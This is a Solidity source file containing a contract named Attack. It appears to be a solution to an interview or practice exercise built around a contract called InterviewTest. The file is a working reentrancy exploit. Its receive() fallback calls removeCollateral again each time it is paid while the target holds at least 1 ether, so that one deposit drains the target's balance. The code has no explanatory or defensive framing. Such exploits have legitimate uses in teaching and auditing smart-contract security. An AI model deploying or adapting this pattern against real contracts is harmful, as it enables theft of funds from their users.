// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

import "./InterviewTest.sol";

contract Attack {
  InterviewTest public interviewTest;

  constructor(address payable _interviewTestAddress) {
    interviewTest = InterviewTest(_interviewTestAddress);
  }

  // Fallback is called when DepositFunds sends Ether to this contract
  receive() external payable {
    if(address(interviewTest).balance >= 1 ether) {
      interviewTest.removeCollateral(1 ether);
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether, "insufficient balance.");
    interviewTest.addCollateral{value: 1 ether}();
    interviewTest.removeCollateral(1 ether);
  }
}